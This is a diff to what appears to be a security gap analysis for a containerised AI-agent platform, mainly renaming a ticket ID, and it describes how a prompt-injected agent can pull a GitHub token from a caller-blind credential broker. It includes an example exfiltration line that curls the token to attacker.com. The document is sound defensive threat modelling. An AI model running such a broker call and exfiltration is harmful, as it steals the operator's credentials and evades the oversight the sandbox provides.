@@ -78,7 +78,7 @@ doesn't weaken it:
   that way (see Gap 6 for the inverse risk on the data that *is* mounted).
 - Neither the **shared** `/credentials/.gitconfig` nor the per-workspace `.git/config`
   embeds the GitHub token — both point at the brokered `shipit-git-credential` helper
-  (`session-credentials.ts:49-59`; workspace routed via SHI-72). No plaintext PAT on disk.
+  (`session-credentials.ts:49-59`; workspace routed via TRACKER-72). No plaintext PAT on disk.
   But the broker remains agent-callable, so the token is still extractable on demand — see
   Gap 2-R.
 
@@ -144,14 +144,14 @@ shared gitconfig, and make that broker **host-aware** — read `host=` from stdi
 credentials only for the configured GitHub host(s), echoing nothing otherwise. Cheap,
 self-contained, high-value; ships independently of the broader egress work.
 
-**Status (SHI-72, shipped):** both sub-problems above are fixed and verified live
+**Status (TRACKER-72, shipped):** both sub-problems above are fixed and verified live
 (2026-06-03). The workspace `.git/config` now points at `shipit-git-credential` (no
 plaintext `ghp_…` on disk), and the broker is host-aware (`git credential fill` for a
 non-GitHub host returns nothing). See Gap 2-R for the residual this *doesn't* close.
 
-### Gap 2-R — The credential broker is caller-blind (residual after SHI-72) *(highest priority)*
+### Gap 2-R — The credential broker is caller-blind (residual after TRACKER-72) *(highest priority)*
 
-**Empirically verified in a live session (2026-06-03), after SHI-72 landed.** Closing the
+**Empirically verified in a live session (2026-06-03), after TRACKER-72 landed.** Closing the
 plaintext-at-rest and host-blindness problems did **not** make the token unreachable by an
 injected agent. The brokered helper is freely invokable by any code running in the
 container, and it returns the full PAT for the legitimate host:
@@ -175,7 +175,7 @@ reads the token via the broker and then exfiltrates it by some *other* channel (
 `curl https://attacker.com/?d=$TOKEN`). That exfil channel is exactly Gap 1, which is
 still open, so today the residual is fully exploitable end-to-end.
 
-In short: SHI-72 moved the token from "plaintext in a file the agent can `cat`" to
+In short: TRACKER-72 moved the token from "plaintext in a file the agent can `cat`" to
 "available on demand from a broker the agent can call." For a *passive* read that's a real
 improvement; for the *active* adversary in the threat model (injected agent, malicious
 `agent.install`, compromised dependency) it is not a barrier.
@@ -250,7 +250,7 @@ provisioned then remounted read-only).
 
 | Pri | Gap | Why first | Rough shape |
 |----|-----|-----------|-------------|
-| ✅ | Gap 2 — host-scoped git helper | Shipped in SHI-72 — no plaintext on disk, broker host-aware | Done |
+| ✅ | Gap 2 — host-scoped git helper | Shipped in TRACKER-72 — no plaintext on disk, broker host-aware | Done |
 | P0 | Gap 2-R — broker is caller-blind | Residual: agent still extracts the PAT on demand via the broker | Short-lived scoped tokens and/or out-of-process git; egress backstop |
 | P0 | Gap 1 — egress allowlist | The load-bearing defense once approval friction is gone | Default-deny egress proxy / internal net + gateway; identity-validating proxy for multi-tenant hosts |
 | P1 | Gap 3 — repo trust gate | Stops "open repo == run its code" | Per-remote trust prompt, deferred install/compose |
